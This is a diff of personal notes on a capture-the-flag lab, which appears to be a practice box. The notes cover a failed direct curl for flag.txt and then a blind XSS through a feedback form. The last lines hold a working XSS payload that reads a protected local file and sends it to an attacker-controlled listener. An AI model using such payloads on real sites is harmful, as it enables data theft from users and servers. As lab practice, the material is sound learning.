@@ -1,5 +1,16 @@
 # id: 10.10.59.111
 
+# hint
+
+Can you read the flag at http://10.10.59.111:8080/flag.txt?
+
+# try it out just now
+
+┌──(root㉿docker-desktop)-[/]
+└─# curl http://10.10.59.111:8080/flag.txt
+
+<h1>401 Unauthorized</h1>
+
 # capture the post message
 
 http://10.10.59.111:8080/submit_feedback
@@ -51,3 +62,15 @@ print("decoded:", decoded)
 # success the blind XSS
 
 ![](https://velog.velcdn.com/images/agnusdei1207/post/b5252105-4522-428d-a133-2239d228ac67/image.png)
+
+# starting the actual blind XSS phase now
+
+python3 -m http.server 8000
+
+<script>
+  fetch('http://127.0.0.1:8080/flag.txt')
+    .then(response => response.text())
+    .then(data => {
+      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
+    });
+</script>
